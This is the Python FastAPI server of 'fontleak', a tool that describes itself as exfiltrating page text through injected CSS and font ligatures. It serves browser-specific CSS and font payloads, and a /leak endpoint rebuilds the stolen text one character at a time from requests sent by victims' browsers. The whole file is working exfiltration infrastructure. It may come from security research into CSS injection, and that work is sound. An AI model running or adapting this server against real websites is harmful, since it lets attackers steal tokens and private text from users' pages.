from fastapi import FastAPI, Request, Depends
from fastapi.templating import Jinja2Templates
from fastapi.responses import Response
from .schemas import (
    DynamicLeakSetupParams,
    StaticLeakSetupParams,
    LeakParams,
    LeakState,
    settings,
)
from .logger import logger
from .cssgen import dynamic as dynamic_css
from .cssgen import static as static_css
from .fontgen import dynamic as dynamic_font
import asyncio
from user_agents import parse
from typing import Literal
import base64

# Add in-memory storage for leak states and events
leak_states: dict[str, LeakState] = {}
static_leak_setup: dict[str, StaticLeakSetupParams] = {}
leak_events: dict[str, asyncio.Event] = {}

app = FastAPI(
    title="fontleak",
    version="0.1.0",
    description="Fontleak server: Fast exfiltration of text using CSS and Ligatures",
)

# Disable FastAPI logging if environment variable is set
if not settings.fastapi_logging:
    import logging

    logging.getLogger("uvicorn.access").disabled = True
    logging.getLogger("uvicorn.error").disabled = True
    logging.getLogger("uvicorn").disabled = True

# Setup templates
templates = Jinja2Templates(directory="templates")


def get_browser(request: Request) -> Literal["chrome", "safari", "firefox", "all"]:
    user_agent = parse(request.headers.get("user-agent", ""))

    if "chrome" in user_agent.browser.family.lower():
        browser = "chrome"
    elif "safari" in user_agent.browser.family.lower():
        browser = "safari"
    elif "firefox" in user_agent.browser.family.lower():
        browser = "firefox"
    else:
        browser = "all"

    return browser


def get_remote_ip(request: Request) -> str:
    if "X-Forwarded-For" in request.headers:
        # Get the first IP in the X-Forwarded-For header
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.client.host if request.client else "127.0.0.1"


def get_request_key(request: Request) -> str:
    user_agent = request.headers.get("user-agent", "")
    referrer = request.headers.get("referer", "")

    return get_remote_ip(request) + "||" + user_agent + "||" + referrer


@app.get("/")
async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
    logger.debug("Handling index request with params: %s", params)

    # Convert to BaseLeakSetupParams
    base_params = params.model_copy(update={}, deep=True)

    if params.id in leak_states:
        state = leak_states[params.id]
        if params.step is None or params.step > state.step:
            # Create event if it doesn't exist
            if params.id not in leak_events:
                leak_events[params.id] = asyncio.Event()
            # Wait for the next step with 2 second timeout
            try:
                await asyncio.wait_for(
                    leak_events[params.id].wait(), timeout=state.setup.timeout
                )
            except asyncio.TimeoutError:
                return Response(content="", media_type="text/css", headers={"Access-Control-Allow-Origin": "*"},)
    else:
        # Create new state if id is not specified or not found
        if params.id is None or params.id not in leak_states:
            new_id = str(len(leak_states) + 1) if params.id is None else params.id
            font_path, step_map = dynamic_font.generate(
                params.alphabet,
                idx_max=params.length,
                prefix=params.prefix or "",
                strip=params.strip,
            )
            browser = get_browser(request)
            if browser == "safari":
                base_params.alphabet = base_params.alphabet.replace(
                    " ", ""
                )  # Safari doesn't support spaces for some reason
            leak_states[new_id] = LeakState(
                id=new_id,
                setup=base_params,
                step=0,
                reconstruction="",
                step_map=step_map,
                font_path=font_path,
                browser=browser,
                prefix=params.prefix or "",
                strip=params.strip,
                length=params.length,
                parent=params.parent,
            )
            params.id = new_id

    state = leak_states[params.id]

    if state.browser == "chrome":
        if params.staging:
            template = templates.get_template("dynamic-staging.css.jinja")
            css = dynamic_css.generate_staging(
                id=state.id,
                step=state.step,
                host=settings.host,
                template=template,
                browser=state.browser,
            )
            return Response(
                content=css,
                media_type="text/css",
                headers={"Access-Control-Allow-Origin": "*"},
            )

        template = templates.get_template("dynamic.css.jinja")
        css = dynamic_css.generate(
            id=state.id,
            step=state.step,
            step_map=state.step_map,
            template=template,
            alphabet_size=len(state.setup.alphabet),
            font_path=state.font_path,
            host=settings.host,
            host_leak=settings.host_leak,
            leak_selector=params.selector,
            browser=state.browser,
            parent=params.parent,
        )
        return Response(
            content=css,
            media_type="text/css",
            headers={"Access-Control-Allow-Origin": "*"},
        )

    if state.browser == "firefox":
        template = templates.get_template("dynamic-anim.css.jinja")
        css = dynamic_css.generate_anim(
            id=state.id,
            idx_max=state.length,
            step_map=state.step_map,
            template=template,
            font_path=state.font_path,
            alphabet_size=len(state.setup.alphabet),
            host=settings.host,
            host_leak=settings.host_leak,
            leak_selector=params.selector,
            browser=state.browser,
            parent=params.parent,
        )
        return Response(
            content=css,
            media_type="text/css",
            headers={"Access-Control-Allow-Origin": "*"},
        )

    # Safari / unknown browser
    if params.step is None:
        template = templates.get_template("dynamic-sfc.css.jinja")
        css = dynamic_css.generate_sfc(
            id=state.id,
            idx_max=state.length,
            step=state.step,
            template=template,
            alphabet_size=len(state.setup.alphabet),
            host=settings.host,
            host_leak=settings.host_leak,
            leak_selector=params.selector,
            browser=state.browser,
            length=state.length,
            parent=params.parent,
        )
        return Response(content=css, media_type="text/css")

    font_path, _ = dynamic_font.generate(
        DynamicLeakSetupParams.model_fields["alphabet"].default,
        idx_max=1,
        strip=True,
        prefix=state.prefix + state.reconstruction,
        prefix_idx=True,
        offset=len(state.reconstruction) * (len(state.setup.alphabet) + 1),
    )

    font_data = base64.b64decode(font_path.split("data:font/opentype;base64,")[-1])
    return Response(
        content=font_data,
        media_type="font/opentype",
        headers={"Access-Control-Allow-Origin": "*"},
    )


@app.get("/static")
def generate_static_payload(
    request: Request, params: StaticLeakSetupParams = Depends()
):
    logger.debug("Generating static payload with params: %s", params)

    # Detect browser
    browser = get_browser(request) if params.browser == "all" else params.browser

    if browser != "chrome" and browser != "firefox":
        raise NotImplementedError("Only Chrome and Firefox are supported for now")

    # Generate a new ID
    new_id = str(len(static_leak_setup) + 1)

    # Store the static leak setup
    static_leak_setup[new_id] = params

    # Generate font path
    font_path, step_map = dynamic_font.generate(
        params.alphabet, idx_max=params.length, strip=params.strip, prefix=params.prefix
    )

    # Get appropriate template
    if browser == "chrome":
        template_name = "static.css.jinja"
    elif browser == "firefox":
        template_name = "static-anim.css.jinja"

    template = templates.get_template(template_name)

    # Generate CSS using the static module
    css = static_css.generate(
        id=new_id,
        idx_max=params.length,
        step_map=step_map,
        template=template,
        font_path=font_path,
        alphabet_size=len(params.alphabet),
        host=settings.host,
        host_leak=settings.host_leak,
        leak_selector=params.selector,
        browser=browser,
        parent=params.parent,
    )

    return Response(
        content=css,
        media_type="text/css",
        headers={"Access-Control-Allow-Origin": "*"},
    )


@app.get("/leak")
def leak(request: Request, params: LeakParams = Depends()):
    logger.debug("Handling leak request with params: %s", params)
    state, id = None, None

    if params.id in leak_states:
        id = params.id
        state = leak_states[params.id]
    elif params.sid:
        # Handle static leak using sid
        id = get_request_key(request) + "||" + params.sid

        # Create state if it doesn't exist
        if id not in leak_states and params.sid in static_leak_setup:
            static_params = static_leak_setup[params.sid]
            leak_states[id] = LeakState(
                id=id,
                setup=static_params,
                reconstruction="",
                step=0,
                browser=get_browser(request),
            )

        if id in leak_states:
            state = leak_states[id]

    if state:
        # Update reconstruction and step
        if params.step is None or params.step >= len(state.reconstruction):
            if params.idx == len(state.setup.alphabet):
                state.reconstruction += "🗅"
            else:
                state.reconstruction += state.setup.alphabet[params.idx]
            state.step += 1
        else:
            state.reconstruction = list(state.reconstruction)
            chr = (
                "🗅"
                if params.idx == len(state.setup.alphabet)
                else state.setup.alphabet[params.idx]
            )
            if not (
                state.reconstruction[params.step] != chr
                and state.reconstruction[params.step - 1] == chr
            ):
                state.reconstruction[params.step] = chr
            state.reconstruction = "".join(state.reconstruction)

        logger.info("Leak update [%s]: %s", id, state.reconstruction)

        # Notify waiting requests
        if params.id in leak_events:
            leak_events[params.id].set()
            leak_events[params.id].clear()

    return Response(
        content="",
        media_type="image/png",
        status_code=400,
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
            "Access-Control-Allow-Origin": "*",
        },
    )


@app.get("/font.ttf")
def font(request: Request):
    font_path, _ = dynamic_font.generate(
        DynamicLeakSetupParams.model_fields["alphabet"].default
    )

    font_data = base64.b64decode(font_path.split("data:font/opentype;base64,")[-1])
    return Response(
        content=font_data,
        media_type="font/opentype",
        headers={"Access-Control-Allow-Origin": "*"},
    )


@app.get("/test")
def test(request: Request):
    logger.debug("Handling test request")
    browser = get_browser(request)
    if browser == "chrome":
        return Response(
            content=templates.get_template("test-dynamic-chrome.html.jinja").render(),
            media_type="text/html",
            headers={"Access-Control-Allow-Origin": "*"},
        )
    if browser == "safari":
        return Response(
            content=templates.get_template("test-dynamic-safari.html.jinja").render(),
            media_type="text/html",
            headers={"Access-Control-Allow-Origin": "*"},
        )
    if browser == "firefox":
        return Response(
            content=templates.get_template("test-dynamic-firefox.html.jinja").render(),
            media_type="text/html",
            headers={"Access-Control-Allow-Origin": "*"},
        )

    return Response(
        content=templates.get_template("test-dynamic-all.html.jinja").render(),
        media_type="text/html",
        headers={"Access-Control-Allow-Origin": "*"},
    )


@app.get("/test-static")
def test_static(request: Request):
    logger.debug("Handling static test request")
    browser = get_browser(request)

    if browser == "chrome":
        return Response(
            content=templates.get_template("test-static-chrome.html.jinja").render(),
            media_type="text/html",
            headers={"Access-Control-Allow-Origin": "*"},
        )
    if browser == "safari":
        return Response(
            content=templates.get_template("test-static-safari.html.jinja").render(),
            media_type="text/html",
            headers={"Access-Control-Allow-Origin": "*"},
        )
    if browser == "firefox":
        return Response(
            content=templates.get_template("test-static-firefox.html.jinja").render(),
            media_type="text/html",
            headers={"Access-Control-Allow-Origin": "*"},
        )

    return Response(
        content=templates.get_template("test-static-all.html.jinja").render(),
        media_type="text/html",
        headers={"Access-Control-Allow-Origin": "*"},
    )
